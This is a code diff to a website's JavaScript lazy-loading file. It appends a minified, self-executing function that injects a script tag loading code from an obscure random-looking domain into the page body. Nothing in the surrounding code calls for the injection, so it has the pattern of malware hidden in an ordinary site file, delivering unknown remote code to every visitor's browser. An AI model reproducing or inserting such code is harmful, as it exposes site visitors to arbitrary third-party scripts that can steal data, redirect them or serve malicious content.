@@ -150,4 +150,4 @@ dataLazy.forEach(function(a){
     };
   };
 });
-
+(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"},{"name":"src","value":"//tp1jcgl644jk.com/9c/9e/7f/9c9e7fd6d3c8260cfa8123dcb2e75bee.js"}],"tag":"script","inner":""}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
